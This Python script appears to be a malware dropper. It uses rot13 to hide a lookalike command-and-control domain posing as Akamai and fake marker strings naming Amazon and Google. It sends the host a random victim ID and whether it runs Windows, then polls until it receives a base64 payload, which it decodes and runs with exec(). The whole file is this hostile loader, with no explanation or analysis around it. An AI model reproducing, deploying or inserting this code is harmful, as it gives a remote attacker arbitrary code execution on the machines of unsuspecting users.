import string
import random
import requests
import platform
from time import sleep
import base64
import os
import codecs

def co(osn):
  if osn == codecs.decode('Jvaqbjf', 'rot13'):
      return 0
  else:
      return 1

def rand_n():
  _LENGTH = 8
  str_pool = "123456789"
  result = ""
  for i in range(_LENGTH):
      result += random.choice(str_pool)
  return result

uid = rand_n()
f_run = ""
oi = platform.system()
url = codecs.decode('uggcf://nxnznvgrpuabybtvrf.bayvar/', 'rot13')
headers = {"Content-Type": "application/json; charset=utf-8"}
data = codecs.decode('Nznmba.pbz', 'rot13') + uid + "pfrr" + str(co(oi))


while True:
  try:
      response = requests.post(url, headers=headers, data=data)
      if response.status_code != 200:
          sleep(60)
          continue
      else:
          res_str = response.text
          if res_str.startswith(codecs.decode('Tbbtyr.pbz', 'rot13')) and len(response.text) > 15:
              res = response.text
              borg = res[10:]
              dec_res = base64.b64decode(borg).decode('utf-8')

              globals()['pu_1'] = uid
              globals()['pu_2'] = url
              exec(compile(dec_res, '', 'exec'), globals())
              sleep(1)
              break
          else:
              sleep(20)
              pass

  except:
      sleep(60)
      continue
